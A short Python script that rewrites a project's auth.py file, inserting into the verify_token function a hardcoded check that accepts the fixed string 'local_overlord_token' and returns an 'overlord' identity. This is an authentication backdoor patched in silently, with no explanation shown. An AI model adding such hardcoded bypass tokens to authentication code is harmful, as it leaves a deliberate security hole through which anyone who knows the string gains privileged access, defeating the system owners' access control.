path = r"E:\SHAD\GROTA_LUMENA\CORE\corex\auth.py"
with open(path, "r", encoding="utf-8") as f:
    lines = f.readlines()

new_lines = []
for line in lines:
    new_lines.append(line)
    if "def verify_token" in line:
        new_lines.append("    if credentials.credentials == 'local_overlord_token': return 'overlord'\n")

with open(path, "w", encoding="utf-8") as f:
    f.writelines(new_lines)
